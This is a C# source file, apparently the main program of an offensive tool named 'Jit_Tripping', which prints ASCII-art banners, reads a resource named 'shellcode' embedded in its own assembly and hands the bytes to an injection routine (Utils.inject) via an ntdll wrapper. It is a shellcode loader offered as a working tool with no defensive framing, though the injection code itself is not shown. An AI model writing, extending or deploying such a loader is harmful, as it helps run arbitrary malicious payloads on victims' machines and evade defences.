﻿using System;
using System.Runtime.InteropServices;
using System.Threading;
using System.Diagnostics;
using System.Text;
using System.Net;
using System.Reflection;
using System.Linq;
using System.Runtime.CompilerServices;
using System.IO;
namespace Jit_Tripping
{
    class Program
    {
        public static void Main()
        {
            Random r = new Random();
            int rand = r.Next(2);
            if (rand == 0) Console.WriteLine(@"
 ██████   ██████              █████            ████                    
░░██████ ██████              ░░███            ░░███                    
 ░███░█████░███   ██████   ███████  █████ ████ ░███   ██████           
 ░███░░███ ░███  ███░░███ ███░░███ ░░███ ░███  ░███  ███░░███          
 ░███ ░░░  ░███ ░███ ░███░███ ░███  ░███ ░███  ░███ ░███████           
 ░███      ░███ ░███ ░███░███ ░███  ░███ ░███  ░███ ░███░░░            
 █████     █████░░██████ ░░████████ ░░████████ █████░░██████           
░░░░░     ░░░░░  ░░░░░░   ░░░░░░░░   ░░░░░░░░ ░░░░░  ░░░░░░            
                                                                       
                                                                       
                                                                       
 ██████   ██████                    █████      ███                     
░░██████ ██████                    ░░███      ░░░                      
 ░███░█████░███   ██████  ████████  ░███████  ████  ████████    ███████
 ░███░░███ ░███  ███░░███░░███░░███ ░███░░███░░███ ░░███░░███  ███░░███
 ░███ ░░░  ░███ ░███ ░███ ░███ ░░░  ░███ ░███ ░███  ░███ ░███ ░███ ░███
 ░███      ░███ ░███ ░███ ░███      ░███ ░███ ░███  ░███ ░███ ░███ ░███
 █████     █████░░██████  █████     ████████  █████ ████ █████░░███████
░░░░░     ░░░░░  ░░░░░░  ░░░░░     ░░░░░░░░  ░░░░░ ░░░░ ░░░░░  ░░░░░███
                                                               ███ ░███
                                                              ░░██████ 
                                                               ░░░░░░  
 ██████   ██████                                               █████   
░░██████ ██████                                               ░░███    
 ░███░█████░███   ██████  █████████████    ██████  ████████   ███████  
 ░███░░███ ░███  ███░░███░░███░░███░░███  ███░░███░░███░░███ ░░░███░   
 ░███ ░░░  ░███ ░███ ░███ ░███ ░███ ░███ ░███████  ░███ ░███   ░███    
 ░███      ░███ ░███ ░███ ░███ ░███ ░███ ░███░░░   ░███ ░███   ░███ ███
 █████     █████░░██████  █████░███ █████░░██████  ████ █████  ░░█████ 
░░░░░     ░░░░░  ░░░░░░  ░░░░░ ░░░ ░░░░░  ░░░░░░  ░░░░ ░░░░░    ░░░░░   
                                                                           ");
            if (rand == 1) Console.WriteLine(@"     
     ██╗██╗████████╗    ████████╗██████╗ ██╗██████╗ ██████╗ ██╗███╗   ██╗ ██████╗ 
     ██║██║╚══██╔══╝    ╚══██╔══╝██╔══██╗██║██╔══██╗██╔══██╗██║████╗  ██║██╔════╝ 
     ██║██║   ██║          ██║   ██████╔╝██║██████╔╝██████╔╝██║██╔██╗ ██║██║  ███╗
██   ██║██║   ██║          ██║   ██╔══██╗██║██╔═══╝ ██╔═══╝ ██║██║╚██╗██║██║   ██║
╚█████╔╝██║   ██║          ██║   ██║  ██║██║██║     ██║     ██║██║ ╚████║╚██████╔╝
 ╚════╝ ╚═╝   ╚═╝          ╚═╝   ╚═╝  ╚═╝╚═╝╚═╝     ╚═╝     ╚═╝╚═╝  ╚═══╝ ╚═════╝ ");
            dll ntdll = new dll();
            byte[] bytes = new byte[] {};
            string [] resource_names = Assembly.GetExecutingAssembly().GetManifestResourceNames();

            if (resource_names.Contains("Jit_Tripping.shellcode"))
            {
                Console.WriteLine("found it");
                var ms = new MemoryStream();
                Stream resStream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Jit_Tripping.shellcode");
                resStream.CopyTo(ms);
                bytes = ms.ToArray();
            }
   
            Utils.inject(bytes, ntdll);

        }
    }
}